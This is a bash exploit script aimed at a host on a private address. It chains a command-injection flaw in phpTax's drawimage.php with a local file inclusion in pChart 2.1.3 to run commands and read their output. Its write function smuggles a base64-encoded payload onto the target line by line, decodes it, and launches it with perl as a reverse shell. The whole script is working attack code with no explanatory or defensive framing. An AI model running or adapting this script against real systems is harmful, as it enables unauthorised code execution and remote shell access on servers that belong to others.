#!/bin/bash
function rce(){
  # phpTax RCE
  payload=`echo $1 | sed 's/ /%20/g'`
  URL="http://172.16.0.101:8080/phptax/drawimage.php?pfilez=1040ab-pg2.tob;$payload%3E/tmp/fuck5;&pdf=make"
  curl -qs  --user-agent "Mozilla/4.0 Mozilla4_browser" $URL | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
  lfi
}

function lfi(){
  # pChart2.1.3 LFI 
  URL='http://172.16.0.101/pChart2.1.3/examples/index.php?Action=View&Script=/tmp/fuck5'
  curl -qs $URL  | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
} 

function write(){
 echo "[-] Starting payload upload to target" 
 FILE='/tmp/reverseshell'
 curl -qs  --user-agent "Mozilla/4.0 Mozilla4_browser" "http://172.16.0.101:8080/phptax/drawimage.php?pfilez=1040ab-pg2.tob;echo%20''%3E$FILE;&pdf=make" &>/dev/null 
 while read line;do
   line=`echo $line| sed 's/+/%2B/g'`
   URL="http://172.16.0.101:8080/phptax/drawimage.php?pfilez=1040ab-pg2.tob;echo%20$line%3E%3E$FILE;&pdf=make"
   echo "[-] Uploading: $line"
   curl -sq --user-agent "Mozilla/4.0 Mozilla4_browser" --retry 0 $URL &>/dev/null 
 done < payload/encode
 echo "[-] Upload Done"
 curl -qs "http://172.16.0.101/pChart2.1.3/examples/index.php?Action=View&Script=$FILE" | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
 payload_size=`wc -l payload/encode | cut -d ' ' -f 1`
 echo "[+] Cleaning  and decoding the payload" 
 rce "cat $FILE | uniq | tail -n $payload_size | /usr/bin/b64decode -r > /tmp/rshell 2>/tmp/teste;"
 echo "[-] Payload is ready to kill"
 curl -qs "http://172.16.0.101/pChart2.1.3/examples/index.php?Action=View&Script=/tmp/rshell" | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
 echo '[-] Starting payload'
 rce 'perl /tmp/rshell'
}
